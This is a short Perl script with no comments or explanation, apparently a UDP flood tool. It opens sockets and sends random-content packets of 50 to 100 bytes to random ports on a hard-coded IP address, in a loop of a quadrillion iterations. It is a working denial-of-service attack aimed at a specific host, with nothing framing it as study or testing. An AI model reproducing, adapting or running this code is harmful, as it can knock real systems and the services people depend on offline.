#!/usr/bin/perl
use strict;
use warnings;
use Socket;

my $target_host = "117.203.8.210";
my $max_size = 100;
my $min_size = 50;
my $packet_count = 1000000000000000;

for (my $i = 0; $i < $packet_count; $i++) {
    my $local_port = int(rand(65535));
    my $target_port = int(rand(65535));
    my $packet_size = int(rand($max_size - $min_size + 1)) + $min_size;
    my $packet_data = join("", map { chr(int(rand(256))) } 1..$packet_size);
    socket(my $socket, PF_INET, SOCK_DGRAM, getprotobyname('udp'));
    bind($socket, sockaddr_in($local_port, INADDR_ANY));
    send($socket, pack("a$packet_size", $packet_data), 0, sockaddr_in($target_port, inet_aton($target_host)));
    close($socket);
}
